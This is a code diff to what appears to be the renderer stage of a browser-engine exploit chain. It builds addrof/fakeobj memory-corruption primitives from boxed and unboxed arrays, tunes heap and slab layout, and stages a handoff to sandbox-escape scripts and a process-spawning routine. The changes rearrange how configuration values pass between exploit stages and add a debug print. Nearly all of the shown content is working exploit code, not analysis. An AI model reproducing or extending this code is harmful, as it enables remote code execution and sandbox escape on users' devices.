@@ -1,14 +1,6 @@
 var SERVER_LOG;
 let offsets;
 let MessageName;
-// Module-scope vars for tweak/level passed in from rce_loader via the
-// stage1 postMessage. They persist across onmessage dispatches because
-// they live outside self.onmessage's execution context. They are NOT
-// promoted onto globalThis until just before sbx0_main_18.4.js eval, to
-// avoid adding heap allocations before the addrof/fakeobj prim setup
-// loop, which is sensitive to slab layout.
-var __ls_pending_tweaks = 'fiveicon';
-var __ls_pending_powercuff_level = 'heavy';
 
 const no_cow = 1.1;
 const unboxed_arr = [no_cow];
@@ -307,15 +299,7 @@ self[1] = boxed_arr;
           const slide = data.slide;
           host = data.desiredHost;
           SERVER_LOG = data.SERVER_LOG;
-          // Stash tweak/level on module-scope vars (declared at the top of
-          // this file) instead of globalThis. They are read back later from
-          // case 'setup_fcall' right before sbx0_main_18.4.js eval. Doing
-          // the assignment to module-scope vars is essentially a slot
-          // overwrite, no new property descriptor or hidden-class
-          // transition, which keeps the slab layout the addrof/fakeobj
-          // setup loop below depends on undisturbed.
-          if (typeof data.ls_tweaks === 'string' && data.ls_tweaks.length > 0) __ls_pending_tweaks = data.ls_tweaks;
-          if (typeof data.ls_powercuff_level === 'string' && data.ls_powercuff_level.length > 0) __ls_pending_powercuff_level = data.ls_powercuff_level;
+          print("inside stage1");
           p.addrof = function addrof(o) {
             boxed_arr[0] = o;
             return BigInt.fromDouble(unboxed_arr[0]);
@@ -964,12 +948,14 @@ self[1] = boxed_arr;
           }
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
-          // Now that the exploit prims are fully set up and we are about to
-          // hand control to sbx0_main_18.4.js -> sbx1_main.js -> spawn_pe(),
-          // promote the module-scope tweak/level vars onto globalThis so the
-          // sbx1_main.js prelude builder in spawn_pe can read them.
-          try { globalThis.__ls_tweaks = __ls_pending_tweaks; } catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
-          try { globalThis.__powercuff_level = __ls_pending_powercuff_level; } catch (e) { globalThis.__powercuff_level = 'heavy'; }
+          // Tweak/level selection arrives in the setup_fcall postMessage
+          // payload (sent from rce_loader's sign_pointers handler). We are
+          // now well past setup_stage2_prim, so the globalThis property
+          // writes are safe here: the slab layout no longer matters and
+          // sbx1_main.js's spawn_pe() will read these globals a moment
+          // later when this worker evals sbx0 -> sbx1.
+          try { globalThis.__ls_tweaks = (typeof data.ls_tweaks === 'string' && data.ls_tweaks.length > 0) ? data.ls_tweaks : 'fiveicon'; } catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
+          try { globalThis.__powercuff_level = (typeof data.ls_powercuff_level === 'string' && data.ls_powercuff_level.length > 0) ? data.ls_powercuff_level : 'heavy'; } catch (e) { globalThis.__powercuff_level = 'heavy'; }
           log("[setup_fcall] tweaks=" + globalThis.__ls_tweaks + " level=" + globalThis.__powercuff_level);
           try {
             // local version
